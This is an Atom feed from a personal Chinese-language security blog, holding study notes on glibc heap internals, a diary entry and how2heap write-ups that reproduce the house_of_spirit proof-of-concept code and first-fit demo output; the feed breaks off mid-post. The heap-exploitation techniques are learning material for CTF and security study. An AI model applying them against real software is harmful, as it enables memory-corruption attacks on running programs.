<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BOBpenのStudio</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-01-25T10:10:04.457Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>BOBpen</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2018/01/24/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2018/01/24/堆基础笔记/</id>
    <published>2018-01-24T13:15:19.972Z</published>
    <updated>2018-01-25T10:10:04.457Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux虚拟内存"><a href="#linux虚拟内存" class="headerlink" title="linux虚拟内存"></a>linux虚拟内存</h1><p><img src="https://ctf-wiki.github.io/ctf-wiki/_images/program_virtual_address_memory_space.png" alt=""></p><ul><li>与下图对应</li></ul><p><img src="http://www.linuxidc.com/upload/2015_02/150225122528321.png" alt=""> </p><p>问题：</p><p>计算机明明没有那么多内存（n个进程的话就需要n*4G）内存</p><p>建立一个进程，就要把磁盘上的程序文件拷贝到进程对应的内存中去，对于一个程序对应的多个进程这种情况，浪费内存！</p><ol><li><p>每个进程的4G内存空间只是虚拟内存空间，每次访问内存空间的某个地址，都需要把地址翻译为实际物理内存地址</p></li><li><p>所有进程共享同一物理内存，每个进程只把自己目前需要的虚拟内存空间映射并存储到物理内存上。</p></li><li><p>进程要知道哪些内存地址上的数据在物理内存上，哪些不在，还有在物理内存上的哪里，需要用页表来记录</p></li><li>页表的每一个表项分两部分，第一部分记录此页是否在物理内存上，第二部分记录物理内存页的地址（如果在的话）</li><li>当进程访问某个虚拟地址，去看页表，如果发现对应的数据不在物理内存中，则缺页异常</li><li>缺页异常的处理过程，就是把进程</li><li>需要的数据从磁盘上拷贝到物理内存中，如果内存已经满了，没有空地方了，那就找一个页覆盖，当然如果被覆盖的页曾经被修改过，需要将此页写回磁盘</li></ol><p><a href="http://www.linuxidc.com/Linux/2015-02/113981.htm" target="_blank" rel="external"><strong>虚拟内存和物理内存的映射</strong></a></p><h2 id="Linux堆"><a href="#Linux堆" class="headerlink" title="Linux堆"></a>Linux堆</h2><blockquote><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/heap_basic_intro.html" target="_blank" rel="external"><strong>堆的基本操作</strong></a></p><p><a href="http://www.cnblogs.com/alisecurity/p/5486458.html" target="_blank" rel="external"><strong>堆内存管理</strong></a></p><ol><li>系统调用：<strong>sbrk（brk）</strong> 和 <strong>mmap</strong> 和 <strong>多线程</strong></li><li>虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，加快了程序的效率。<strong>我们称这一块连续的内存区域为arena。</strong>此外，由于这块内存是由<strong>主线程</strong>申请的，所以我们称之为<strong>main_arena</strong>。对于后续的申请的内存会一直从这个arena中获取，直到空间不足。当出现arena空间不足时，<strong>它可以通过增加brk的方式来增加堆的空间。类似地，arena也可以通过减小brk来缩小自己的空间</strong>。</li><li>当不开启ASLR保护时，start_brk以及brk会指向data/bss 段的结尾。</li><li>当开启ASLR保护时，start_brk以及brk也会指向同一位置，只是这个位置是在data/bss段结尾后的<strong>随机偏移处</strong></li><li><strong>每个arena中含有多个chunk，这些chunk以链表的形式加以组织</strong></li></ol></blockquote><h2 id="NO-1"><a href="#NO-1" class="headerlink" title="NO.1"></a>NO.1</h2><p>###0x01-基础</p><ul><li>创建线程 pthread_create()</li><li>在新的线程创建之后，可以看到还未调用malloc，thread1的栈空间<strong>已经分配好</strong></li><li>同主线程一致，malloc之后，会得到一个<strong>大的arena</strong>，<strong>该线程后续申请堆空间就从剩余部分申请</strong></li></ul><p>###0x02-多Arena管理</p><ul><li>并不是每个线程都有自己独立的arena，与处理器的核心个数有关</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">For 32 bit systems:</div><div class="line">     Number of arena = 2 * number of cores + 1.</div><div class="line">For 64 bit systems:</div><div class="line">     Number of arena = 8 * number of cores + 1.</div></pre></td></tr></table></figure><ul><li>多arena管理</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">假设有如下情境：一台只含有一个处理器核心的PC机安装有32位操作系统，其上运行了一个多线程应用程序，共含有4个线程——主线程和三个用户线程。显然线程个数大于系统能维护的最大arena个数（2*核心数 + 1= 3），那么此时glibc malloc就需要确保这4个线程能够正确地共享这3个arena，那么它是如何实现的呢？</div><div class="line"></div><div class="line">当主线程首次调用malloc的时候，glibc malloc会直接为它分配一个main arena，而不需要任何附加条件。</div><div class="line"></div><div class="line">当用户线程1和用户线程2首次调用malloc的时候，glibc malloc会分别为每个用户线程创建一个新的thread arena。此时，各个线程与arena是一一对应的。但是，当用户线程3调用malloc的时候，就出现问题了。因为此时glibc malloc能维护的arena个数已经达到上限，无法再为线程3分配新的arena了，那么就需要重复使用已经分配好的3个arena中的一个(main arena, arena 1或者arena 2)。那么该选择哪个arena进行重复利用呢？</div><div class="line">1)首先，glibc malloc循环遍历所有可用的arenas，在遍历的过程中，它会尝试lock该arena。如果成功lock(该arena当前对应的线程并未使用堆内存则表示可lock)，比如将main arena成功lock住，那么就将main arena返回给用户，即表示该arena被线程3共享使用。</div><div class="line"></div><div class="line">2)而如果没能找到可用的arena，那么就将线程3的malloc操作阻塞，直到有可用的arena为止。</div><div class="line"></div><div class="line">3)现在，如果线程3再次调用malloc的话，glibc malloc就会先尝试使用最近访问的arena(此时为main arena)。如果此时main arena可用的话，就直接使用，否则就将线程3阻塞，直到main arena再次可用为止。</div><div class="line"></div><div class="line">这样线程3与主线程就共享main arena了。至于其他更复杂的情况，以此类推。</div></pre></td></tr></table></figure><p>###0x03-堆管理中的数据结构</p><p><img src="/Users/linwei/blog/source/_posts/IMG_2491.JPG" alt=""></p><ol><li>heap_info: 即Heap Header,因为一个thread arena（注意：不包含main thread）可以包含多个heaps，所以为了便于管理，就给每个heap分配一个heap header</li><li>malloc_state: 即Arena Header，每个thread只含有一个Arena Header</li><li>malloc_chunk: 即Chunk Header，一个heap被分为多个chunk</li></ol><p>###0x04-note</p><ol><li><p>Main thread不含有多个heaps所以也就不含有heap_info结构体。当需要更多堆空间的时候，就通过扩展sbrk的heap segment来获取更多的空间，直到它碰到内存mapping区域为止。</p></li><li><p>不同于thread arena，main arena的arena header并不是sbrk heap segment的一部分，而是一个全局变量！因此它属于libc.so的data segment。</p></li></ol><p>###0x05 malloc<strong>_state(arena header) 和 heap</strong>info(heap header)<br><img src="http://epo.alicdn.com/image/41u4skqanfb0.png" alt=""><br><img src="http://epo.alicdn.com/image/41u4snuicn70.png" alt=""></p><p>###0x06-chunk</p><ul><li><strong>最终版chunk构造</strong></li></ul><p><strong>allocated_chunk</strong></p><p><img src="http://epo.alicdn.com/image/41u4u4r5kvt0.png" alt=""><br><img src="http://epo.alicdn.com/image/41u4u6t5tnk0.png" alt=""><br><img src="http://security.pingan.com/static/upload/2eb47c85f5a863a5c2904e529c0409a6.png" alt=""></p><ol><li>prev_size: 如果当前chunk的相邻前一chunk未被使用，prev_size为此前一chunk的大小</li><li>size: 当前chunk的大小。由于chunk大小是8的整数倍，所以此size的后3 bit被用于存储其他信息</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">PREV_INUSE(P): 表示前一个chunk是否为allocated。</div><div class="line"></div><div class="line">IS_MMAPPED(M)：表示当前chunk是否是通过mmap系统调用产生的。</div><div class="line"></div><div class="line">NON_MAIN_ARENA(N)：表示当前chunk是否是thread arena。</div><div class="line">~~~ </div><div class="line"></div><div class="line">3.**TOP_chunk**</div><div class="line"></div><div class="line">当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk。该chunk并不属于任何bin，而是在系统当前的所有free chunk(无论哪种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。</div><div class="line"></div><div class="line">4.**Last Remainder Chunk**</div><div class="line"></div><div class="line">* 产生</div><div class="line"></div><div class="line">当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk。</div><div class="line"></div><div class="line">* 作用</div><div class="line"></div><div class="line">此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：**前者分配给用户，剩下的部分放到unsorted bin中**，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，**各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性**</div><div class="line"></div><div class="line"></div><div class="line">###0x07-Bin管理</div><div class="line"></div><div class="line">之前知道，在free之后，空间并没有回收，而是交给操作系统管理，其实就是交给bin链表处理</div><div class="line"></div><div class="line">* 1) Fast bin; 2) Unsorted bin; 3) Small bin; 4) Large bin</div><div class="line"></div><div class="line">* **fastbins**: 这是一个数组，用于记录所有的fast bins；</div><div class="line"></div><div class="line">  **bins**: 这也是一个数组，用于记录除fast bins之外的所有bins。事实上，一共有126个bins，分别是：</div></pre></td></tr></table></figure><p>bin 1 为unsorted bin;</p><p>bin 2 到63为small bin;</p><p>bin 64到126为large bin。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">![](http://epo.alicdn.com/image/420rbsdeo2o0.png)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">###0x08-Fast bin</div><div class="line"></div><div class="line">**16-80字节(32位)**   </div><div class="line">**32位下的chunk头8字节，fd，bk8字节(各4✖️8=32)，所以实际可用空间总比整体大小小16字节**</div><div class="line"></div><div class="line">* 特性：</div><div class="line"></div><div class="line">1)fast bin的个数——10个</div><div class="line"></div><div class="line">2)每个fast bin都是一个单链表(只使用fd指针)。为什么使用单链表呢？因为在fast bin中无论是添加还是移除fast chunk，都是对“链表尾”进行操作，而不会对某个中间的fast chunk进行操作。更具体点就是LIFO(后入先出)算法：添加操作(free内存)就是将新的fast chunk加入链表尾，删除操作(malloc内存)就是将链表尾部的fast chunk删除。需要注意的是，为了实现LIFO算法，fastbins数组中每个fastbin元素均指向了该链表的rear end（尾结点），而尾结点通过其fd指针指向前一个结点，依次类推</div><div class="line"></div><div class="line">3) chunk size：10个fast bin中所包含的fast chunk size是**按照步进8字节**排列的，即第一个fast bin中所有fast chunk size均为16字节，第二个fast bin中为24字节，依次类推。在进行malloc初始化的时候，最大的fast chunk size被设置为80字节(chunk unused size为64字节)，因此默认情况下大小为16到80字节的chunk被分类到fast chunk。详情如图2-1所示。</div><div class="line"></div><div class="line">4) 不会对free chunk进行合并操作。鉴于设计fast bin的初衷就是进行快速的小内存分配和释放，因此系统将属于fast bin的chunk的P(未使用标志位)总是设置为1，这样即使当fast bin中有某个chunk同一个free chunk相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜。</div><div class="line"></div><div class="line">5) malloc(fast chunk)操作：即用户通过malloc请求的大小属于fast chunk的大小范围(注意：用户请求size加上16字节就是实际内存chunk size)。在初始化的时候fast bin支持的最大内存大小以及所有fast bin链表都是空的，所以当最开始使用malloc申请内存的时候，即使申请的内存大小属于fast chunk的内存大小(即16到80字节)，它也不会交由fast bin来处理，而是向下传递交由small bin来处理，如果small bin也为空的话就交给unsorted bin处理：</div></pre></td></tr></table></figure></p><p>/<em> The maximum fastbin request size we support </em>/</p><p>#define MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</p><p>#define NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1</p><p>根据max的定义，可得64位下，(SIZE_SZ就是size_t=8)最大的size就是160字节<br>~~~</p><p>6) free(fast chunk)操作：这个操作很简单，主要分为两步：先通过chunk-size函数根据传入的地址指针获取该指针对应的chunk的大小；然后根据这个chunk大小获取该chunk所属的fast bin，然后再将此chunk添加到该fast bin的链尾即可。整个操作都是在_int_free函数中完成。</p><p><img src="http://security.pingan.com/static/upload/ed79643b225c1c218b764325c62a1afd.png" alt=""></p><p>7） 当分配一块较小的内存(mem&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；<strong>否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回</strong></p><p>###0x09-Unsorted Bin</p><p>当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。为什么要这么做呢？<strong>这主要是为了让“glibc malloc机制”能够有第二次机会重新利用最近释放的chunk(第一次机会就是fast bin机制)</strong>。利用unsorted bin，可以加快内存的分配和释放操作，因为整个操作都不再需要花费额外的时间去查找合适的bin了。</p><p>Unsorted bin的特性如下：</p><p>1) unsorted bin的个数： 1个。unsorted bin是一个由free chunks组成的循环双链表。</p><p>2) Chunk size: 在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。</p><p>###0x10—Small Bin<br>小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢。</p><p>Small bin的特性如下：</p><p>1) small bin个数：62个。每个small bin也是一个由对应free chunk组成的循环双链表。同时Small bin采用FIFO(先入先出)算法：内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk。</p><p>2) chunk size: 同一个small bin中所有chunk大小是一?样的，且第一个small bin中chunk大小为16字节，后续每个small bin中chunk的大小依次增加8字节，即最后一个small bin的chunk为16 + 62 * 8 = 512字节。</p><p>3) 合并操作：相邻的free chunk需要进行合并操作，即合并成一个大的free chunk。</p><p>4) malloc(small chunk)操作：类似于fast bins，最初所有的small bin都是空的，因此在对这些small bin完成初始化之前，即使用户请求的内存大小属于small chunk也不会交由small bin进行处理，而是<strong>交由unsorted bin处理</strong>，如果unsorted bin也不能处理的话，<strong>glibc malloc就依次遍历后续的所有bins</strong>，找出第一个满足要求的bin，如果所有的bin都不满足的话，就转而使用top chunk，如果top chunk大小不够，那么就扩充top chunk，这样就一定能满足需求了</p><p>5) free(small chunk)：当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，<strong>最后将新的chunk添加到unsorted bin中</strong></p><p>###0x11-Large Bin</p><p>大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。</p><p>Large bin的特性如下：</p><p>1) large bin的数量：63个。Large bin类似于small bin，<strong>只是需要注意两点：一是同一个large bin中每个chunk的大小可以不一样，但必须处于某个给定的范围</strong>(特例2) ；<strong>二是large chunk可以添加、删除在large bin的任何一个位置</strong>。</p><p>在这63个large bins中，前32个large bin依次以64字节步长为间隔，即第一个large bin中chunk size为512~575字节，第二个large bin中chunk size为576 ~ 639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。</p><p>鉴于同一个large bin中每个chunk的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个large bin中的所有chunk按照chunk size进行从大到小的排列：最大的chunk放在链表的front end，最小的chunk放在rear end。</p><p>2) 合并操作：类似于small bin。</p><p>3) malloc(large chunk)操作：</p><p>初始化完成之前的操作类似于small bin，这里主要讨论large bins初始化完成之后的操作。首先确定用户请求的大小属于哪一个large bin，然后判断该large bin中最大的chunk的size是否大于用户请求的size(只需要对比链表中front end的size即可)。如果大于，就从rear end开始遍历该large bin，找到第一个size相等或接近的chunk，分配给用户。如果该chunk大于用户请求的size的话，就将该chunk拆分为两个chunk：前者返回给用户，且size等同于用户请求的size；剩余的部分做为一个新的chunk添加到unsorted bin中。</p><p>如果该large bin中最大的chunk的size小于用户请求的size的话，那么就依次查看后续的large bin中是否有满足需求的chunk，不过需要注意的是鉴于bin的个数较多(不同bin中的chunk极有可能在不同的内存页中)，如果按照上一段中介绍的方法进行遍历的话(即遍历每个bin中的chunk)，就可能会发生多次内存页中断操作，进而严重影响检索速度，所以glibc malloc设计了Binmap结构体来帮助提高bin-by-bin检索的速度。<strong>Binmap记录了各个bin中是否为空，通过bitmap可以避免检索一些空的bin。如果通过binmap找到了下一个非空的large bin的话，就按照上一段中的方法分配chunk，否则就使用top chunk来分配合适的内存</strong>。</p><p>4) Free(large chunk)：类似于small chunk。</p><p><img src="http://epo.alicdn.com/image/420rc31ppb10.jpg" alt=""></p><p>###0x12-Note</p><ol><li>都是unsorted-bin 到 各种bin  到  top-bin 的处理顺序</li><li>fast-bin都是有一个16字节的差，所以例如40bytes，实际24bytes，但是申请32字节的时候返回的是这个chunk，因为allocted的情况下，没有fd，bk。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;linux虚拟内存&quot;&gt;&lt;a href=&quot;#linux虚拟内存&quot; class=&quot;headerlink&quot; title=&quot;linux虚拟内存&quot;&gt;&lt;/a&gt;linux虚拟内存&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://ctf-wiki.github.io/ctf-w
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2017/10/18/%E5%86%99%E5%9C%A8%E5%85%B6%E5%AE%9E%E4%B8%8D%E6%98%AF%E6%9C%80%E5%89%8D%E7%9A%84%E6%9C%80%E5%89%8D/"/>
    <id>http://yoursite.com/2017/10/18/写在其实不是最前的最前/</id>
    <published>2017-10-17T16:39:54.000Z</published>
    <updated>2017-10-17T17:01:23.000Z</updated>
    
    <content type="html"><![CDATA[<p> Nothing But Change</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>2017.10.19日凌晨。<br>电脑忘了充电，熄灯了。<br>还有11%的电</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>大二开学一个月了，人总是会莫名其妙地觉得好像心理丢失了什么。<br>台灯，漆黑的宿舍，只剩我一人还在床下。<br>11点和老哥的一次通话，    本来是谈学习问题，本来是不想讲多少的。莫名好像被触碰到了什么，总结过来就是从高中到现在都会有的瞬时性的，突然性的颓废感。自己的兴趣呢，自己的出发点呢。<br>仅仅开学一个月，我得到了三台可以说是在同学，甚至是大部分同龄人中最出色和最奢侈的装备了。可能父母想来我是需要的吧。辛苦的他们或许是对我的期望很高吧，还有老哥。<br>常常在想，是什么在作祟。老哥的期望，父母的期望，自己的期望。到头来，看似风光的背后却是捉襟见肘的水平。今天，10.19.<br>12:48.我敢真正说出口，大声说出口。我让你们失望了。可以说是水过来的。</p><p>敲文章敲的很吃力。因为真的很心虚，也害怕我只是又是一时感到的堕落和想认真奋斗。</p><p>浪费浪费了太多时间。</p><p>明明技术是最让我痴迷地。或许现在我可以扪心自问，真正让我痴迷吗。</p><p>也可能是课太多，实验太多了吧</p><p>有的时候在想，自己到底能给父母什么，自己到底能让无私帮助的老哥骄傲吗。</p><p>答案是什么，还是靠自己去努力吧</p><p>这篇文章应该是个起步吧。当我真正卖掉了游戏电脑，就好像是朝一种生活方式做一个几乎断绝的告别。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>想一个问题，自己到底是什么类型的学习份子，是任务驱动还是兴趣更多占据主导的兴趣使然。现在想来不要太过纠结，只要你是想变好。就行了，至于其他的，就随他去吧</p><p>希望自己能好好的。希望父母能好好的，希望在大学陪伴我的老哥能好好的。我真心希望你们都能好好的，不想让自己辜负你们。不仅让你们这么觉得，也要我自己能对自己满意。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; Nothing But Change&lt;/p&gt;
&lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;2017.10.19日凌晨。&lt;br&gt;电脑忘了充电，熄灯了。&lt;br&gt;还有
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2017/10/13/how2heap-serious-2/"/>
    <id>http://yoursite.com/2017/10/13/how2heap-serious-2/</id>
    <published>2017-10-13T05:32:32.000Z</published>
    <updated>2017-10-01T05:08:59.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>这篇文章是how2heap系列剩下的总结。</p><h2 id="0x01-house-of-spirit"><a href="#0x01-house-of-spirit" class="headerlink" title="0x01-house_of_spirit"></a>0x01-house_of_spirit</h2><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">printf(&quot;This file demonstrates the house of spirit attack.\n&quot;);</div><div class="line"></div><div class="line">printf(&quot;Calling malloc() once so that it sets up its memory.\n&quot;);</div><div class="line">malloc(1);</div><div class="line"></div><div class="line">printf(&quot;We will now overwrite a pointer to point to a fake &apos;fastbin&apos; region.\n&quot;);</div><div class="line">unsigned long long *a;</div><div class="line">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</div><div class="line">unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));</div><div class="line"></div><div class="line">printf(&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[7]);</div><div class="line"></div><div class="line">printf(&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;);</div><div class="line">printf(&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;);</div><div class="line">fake_chunks[1] = 0x40; // this is the size</div><div class="line"></div><div class="line">printf(&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;);</div><div class="line">        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</div><div class="line">fake_chunks[9] = 0x1234; // nextsize</div><div class="line"></div><div class="line">printf(&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;, &amp;fake_chunks[1]);</div><div class="line">printf(&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;);</div><div class="line">a = &amp;fake_chunks[2];</div><div class="line"></div><div class="line">printf(&quot;Freeing the overwritten pointer.\n&quot;);</div><div class="line">free(a);</div><div class="line"></div><div class="line">printf(&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]);</div><div class="line">printf(&quot;malloc(0x30): %p\n&quot;, malloc(0x30));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>很简单的一个利用构造来malloc出想要的地址的方法，其中，这里是在栈上构造堆。几个注意点记录一下。</p><ol><li><strong>attribute</strong> ((aligned (16))      指的是16字节对齐。</li><li>创建一个指针，指向伪造的chunk1部分，chunk1是一个伪造的fastbin块，free之后，在下次系统调用的时候就会返回这个地址，便达到了目的</li><li>chunk2的构造中的size需要过掉一些检查</li></ol><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;这篇文章是how2heap系列剩下的总结。&lt;/p&gt;
&lt;h2 id=&quot;0x01-house-of-spirit&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>&#39;how-heap-serious&#39;</title>
    <link href="http://yoursite.com/2017/09/23/how2heap-serious-1/"/>
    <id>http://yoursite.com/2017/09/23/how2heap-serious-1/</id>
    <published>2017-09-23T05:35:54.000Z</published>
    <updated>2017-09-24T16:36:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-first-fit"><a href="#0x01-first-fit" class="headerlink" title="0x01-first-fit"></a>0x01-first-fit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.</div><div class="line">glibc uses a first-fit algorithm to select a free chunk.</div><div class="line">If a chunk is free and large enough, malloc will select this chunk.</div><div class="line">This can be exploited in a use-after-free situation.</div><div class="line">Allocating 2 buffers. They can be large, don&apos;t have to be fastbin.</div><div class="line">1st malloc(512): 0x556e1bfa2420</div><div class="line">2nd malloc(256): 0x556e1bfa2630</div><div class="line">we could continue mallocing here...</div><div class="line">now let&apos;s put a string at a that we can read later &quot;this is A!&quot;</div><div class="line">first allocation 0x556e1bfa2420 points to this is A!</div><div class="line">Freeing the first one...</div><div class="line">We don&apos;t need to free anything again. As long as we allocate less than 512, it will end up at 0x556e1bfa2420</div><div class="line">So, let&apos;s allocate 500 bytes</div><div class="line">3rd malloc(500): 0x556e1bfa2420</div><div class="line">And put a different string here, &quot;this is C!&quot;</div><div class="line">3rd allocation 0x556e1bfa2420 points to this is C!</div><div class="line">first allocation 0x556e1bfa2420 points to this is C!</div><div class="line">If we reuse the first allocation, it now holds the data from the third allocation.</div></pre></td></tr></table></figure><p>编译过后，看到glibc用一种first-fit算法去选择分配一个块。用到这里可以UAF这个漏洞，但是我先不考虑这个。</p><p>总结就两点：<br>1.连续申请了两个堆块，free第一个之后，只要你继续申请的块的大小是小于这个512的话，就会返回chunk1开始的地址。<br>2，因此，如果改变了chunk3的值，会发现指针1（第一个chunk块）也指向了这个字符串</p><p>因此我们只要改写指针1的指向，就能改变指针3，验证一下。我再源码中最后加入了两行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">strcpy(a, &quot;this is A!&quot;);</div><div class="line">printf(&quot;first allocation %p points to %s\n&quot;, a, a);</div><div class="line">printf(&quot;3rd allocation %p points to %s\n&quot;, c, c);</div></pre></td></tr></table></figure></p><p>结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">first allocation 0x55d93d93f420 points to this is A!</div><div class="line">3rd allocation 